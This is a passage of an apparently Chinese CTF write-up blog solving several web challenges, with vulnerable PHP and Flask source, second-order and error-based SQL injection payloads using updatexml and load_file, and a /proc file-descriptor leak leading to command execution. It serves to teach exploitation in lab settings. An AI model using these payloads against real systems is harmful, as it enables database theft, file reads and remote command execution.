</span></span><span style="display:flex;"><span>        $row <span style="color:#f92672">=</span> $fetch<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fetch_assoc</span>();
</span></span><span style="display:flex;"><span>        $sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;update `user` set `address`=&#39;&#34;</span><span style="color:#f92672">.</span>$address<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39;, `old_address`=&#39;&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;address&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39; where `user_id`=&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;user_id&#39;</span>];
</span></span><span style="display:flex;"><span>        $result <span style="color:#f92672">=</span> $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>($sql);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$result) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;error&#39;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print_r</span>($db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;订单修改成功&#34;</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;未找到订单!&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;信息不全&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>delete.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require_once</span> <span style="color:#e6db74">&#34;config.php&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#34;user_name&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#34;phone&#34;</span>]))
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>    $pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;</span>;
</span></span><span style="display:flex;"><span>    $user_name <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;user_name&#34;</span>];
</span></span><span style="display:flex;"><span>    $phone <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;phone&#34;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>($pattern,$user_name) <span style="color:#f92672">||</span> <span style="color:#a6e22e">preg_match</span>($pattern,$phone)){ 
</span></span><span style="display:flex;"><span>        $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;no sql inject!&#39;</span>;
</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>        $sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select * from `user` where `user_name`=&#39;</span><span style="color:#e6db74">{</span>$user_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and `phone`=&#39;</span><span style="color:#e6db74">{</span>$phone<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span>        $fetch <span style="color:#f92672">=</span> $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>($sql);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($fetch) <span style="color:#f92672">&amp;&amp;</span> $fetch<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">num_rows</span><span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>        $row <span style="color:#f92672">=</span> $fetch<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fetch_assoc</span>();
</span></span><span style="display:flex;"><span>        $result <span style="color:#f92672">=</span> $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#39;delete from `user` where `user_id`=&#39;</span> <span style="color:#f92672">.</span> $row[<span style="color:#e6db74">&#34;user_id&#34;</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$result) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;error&#39;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print_r</span>($db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;订单删除成功&#34;</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;未找到订单!&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;信息不全&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>config.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#34;open_basedir&#34;</span>, <span style="color:#a6e22e">getcwd</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;:/etc:/tmp&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$DATABASE <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;host&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;root&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;root&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;dbname&#34;</span> <span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;ctfusers&#34;</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$db <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>($DATABASE[<span style="color:#e6db74">&#39;host&#39;</span>],$DATABASE[<span style="color:#e6db74">&#39;username&#39;</span>],$DATABASE[<span style="color:#e6db74">&#39;password&#39;</span>],$DATABASE[<span style="color:#e6db74">&#39;dbname&#39;</span>]);
</span></span></code></pre></div><p>change.php中未对address进行过滤，尝试注入点为address的二次注入＋报错注入，用户权限为root，可以load_file：</p>
<pre tabindex="0"><code>1&#34;&#39; and updatexml(1,concat(0x7e,database()),1)#
errorXPATH syntax error: &#39;~ctfusers&#39;

1&#34;&#39; and updatexml(1,concat(0x7e,(select load_file(&#34;/flag.txt&#34;))),1)#
errorXPATH syntax error: &#39;~flag{9f15a769-7b93-45f5-add5-3d&#39;

1&#34;&#39; and updatexml(1,concat(0x7e,substr((select load_file(&#34;/flag.txt&#34;)),30)),1)#
errorXPATH syntax error: &#39;~3dbf4a23b76f}
</code></pre><p>flag{9f15a769-7b93-45f5-add5-3dbf4a23b76f}</p>
<hr>
<h2 id="网鼎杯-2020-白虎组picdown">[网鼎杯 2020 白虎组]PicDown<a hidden class="anchor" aria-hidden="true" href="#网鼎杯-2020-白虎组picdown">#</a></h2>
<p>url是个任意文件读取，先从环境变量获取工作目录/proc/self/environ：</p>
<pre tabindex="0"><code>PWD=/app
</code></pre><p>/app/app.py：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, Response
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> render_template
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> request
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SECRET_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp/secret.txt&#34;</span>
</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> open(SECRET_FILE)
</span></span><span style="display:flex;"><span>SECRET_KEY <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>remove(SECRET_FILE)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;search.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/page&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">page</span>():
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;url&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> url<span style="color:#f92672">.</span>lower()<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;file&#34;</span>):
</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>urlopen(url)
</span></span><span style="display:flex;"><span>            value <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> Response(value, mimetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;application/octet-stream&#39;</span>)
</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Content-Disposition&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;attachment; filename=beautiful.jpg&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> response
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;HACK ERROR!&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SOMETHING WRONG!&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;search.html&#39;</span>, res<span style="color:#f92672">=</span>value)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/no_one_know_the_manager&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">manager</span>():
</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;key&#34;</span>)
</span></span><span style="display:flex;"><span>    print(SECRET_KEY)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> key <span style="color:#f92672">==</span> SECRET_KEY:
</span></span><span style="display:flex;"><span>        shell <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;shell&#34;</span>)
</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>system(shell)
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ok&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Wrong Key!&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">8080</span>)
</span></span></code></pre></div><p>未关闭SECRET_FILE的文件流，利用fd仍然可以读取该文件内容，/proc/self/fd/3：</p>
<pre tabindex="0"><code>PExSWPFkA1V0CvVHVBjiLwoewfZT8tz2ERO30FehoiQ=
</code></pre><p>os.system命令执行的结果不会输出到网页，尝试将命令结果保存到/tmp目录下：</p>
<pre tabindex="0"><code>ls / | cat &gt; /tmp/1.txt
</code></pre><p>发现根目录下有flag文件：flag{76d21877-ab9e-41dd-973e-28ac68487ed4}</p>
<hr>
<h2 id="b01lers2020welcome-to-earth">[b01lers2020]Welcome to Earth<a hidden class="anchor" aria-hidden="true" href="#b01lers2020welcome-to-earth">#</a></h2>
<p>一直跳转，看每个网页的js和源码就行，/static/js/fight.js：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// Run to scramble original flag
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//console.log(scramble(flag, action));
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">scramble</span>(<span style="color:#a6e22e">flag</span>, <span style="color:#a6e22e">key</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">i</span>) <span style="color:#f92672">%</span> <span style="color:#a6e22e">flag</span>.<span style="color:#a6e22e">length</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">temp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">flag</span>[<span style="color:#a6e22e">i</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">flag</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">flag</span>[<span style="color:#a6e22e">n</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">flag</span>[<span style="color:#a6e22e">n</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">temp</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">flag</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check_action</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">action</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;action&#34;</span>).<span style="color:#a6e22e">value</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;{hey&#34;</span>, <span style="color:#e6db74">&#34;_boy&#34;</span>, <span style="color:#e6db74">&#34;aaaa&#34;</span>, <span style="color:#e6db74">&#34;s_im&#34;</span>, <span style="color:#e6db74">&#34;ck!}&#34;</span>, <span style="color:#e6db74">&#34;_baa&#34;</span>, <span style="color:#e6db74">&#34;aaaa&#34;</span>, <span style="color:#e6db74">&#34;pctf&#34;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// TODO: unscramble function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span></code></pre></div><p>看格式猜出flag：pctf{hey_boys_im_baaaaaaaaaack!}</p>
<hr>
<h2 id="october-2019-twice-sql-injection">October 2019 Twice SQL Injection<a hidden class="anchor" aria-hidden="true" href="#october-2019-twice-sql-injection">#</a></h2>
<p>二次注入，登录成功有个Info，猜测后端语句是：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> Info <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">table_name</span> <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">或</span><span style="color:#66d9ef">select</span> Info <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">table_name</span> <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">and</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span></code></pre></div><p>注册用户时将username设置为联合注入语句：</p>
<pre tabindex="0"><code>username=1&#39; union select database() #
ctftraining

username=1&#39; union select group_concat(table_name) from information_schema.tables where table_schema=database() #
flag,news,users

username=1&#39; union select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39; #
flag

username=1&#39; union select flag from flag #
flag{5bbcd66f-a075-4532-bfce-6aa8642e41f3}
</code></pre><p>也可以先看看sql用户权限，如果是root直接可以load_file：</p>
<pre tabindex="0"><code>username=1&#39; union select user() #
root@localhost

username=1&#39; union select load_file(&#39;/var/www/html/index.php&#39;) #
</code></pre><p>index.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#e6db74">/**
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Database mysql
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> */</span>
</span></span><span style="display:flex;"><span>$db_host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>;
</span></span><span style="display:flex;"><span>$db_user <span style="color:#f92672">=</span> $db_pass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;root&#34;</span>;
</span></span><span style="display:flex;"><span>$db_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ctftraining&#34;</span>;
</span></span><span style="display:flex;"><span>$conn <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_connect</span>($db_host, $db_user, $db_pass) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Could not connect: &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">mysql_error</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mysql_select_db</span>($db_name, $conn) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Could select database: &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">mysql_error</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">register_shutdown_function</span>(<span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> $conn;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mysql_close</span>($conn);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">query</span>($sql) {
</span></span><span style="display:flex;"><span>	$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_query</span>($sql);
</span></span><span style="display:flex;"><span>	$rows <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_fetch_assoc</span>($result);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> $rows;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#e6db74">/**
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Main
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$action <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;action&#39;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;action&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;index&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($action, [<span style="color:#e6db74">&#39;login&#39;</span>, <span style="color:#e6db74">&#39;reg&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>])) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: /?action=login&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">switch</span> ($action) {
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;login&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>])) {
</span></span><span style="display:flex;"><span>		$username <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>]);
</span></span><span style="display:flex;"><span>		$password <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>]);
</span></span><span style="display:flex;"><span>		$res <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;select * from users where username=&#39;</span><span style="color:#e6db74">{</span>$username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and password=&#39;</span><span style="color:#e6db74">{</span>$password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($res) {
</span></span><span style="display:flex;"><span>			$_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">=</span> $res[<span style="color:#e6db74">&#39;username&#39;</span>];
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: /?action=index&#34;</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;h1&gt;Login&lt;/h1&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;form action=&#34;/?action=login&#34; method=&#34;POST&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			Username : &lt;input type=&#34;text&#34; name=&#34;username&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			Password : &lt;input type=&#34;password&#34; name=&#34;password&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			&lt;a href=&#34;/?action=reg&#34;&gt;Go to Register&lt;/a&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			&lt;input type=&#34;submit&#34; value=&#34;Login&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;/form&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	&lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	break;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">case &#39;reg&#39;:
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	if (isset($_POST[&#39;username&#39;]) &amp;&amp; $_POST[&#39;username&#39;] != &#34;&#34;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		$username = addslashes($_POST[&#39;username&#39;]);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		$password = md5($_POST[&#39;password&#39;]);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		if (mysql_query(&#34;insert into users(username,password,info) values (&#39;{$username}&#39;,&#39;{$password}&#39;,&#39;十月太懒，没有简介&#39;);&#34;)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			header(&#34;Location: /?action=login&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		} else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			header(&#34;Location: /?action=reg&amp;msg=注册失败&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		exit;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	} else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		?&gt;
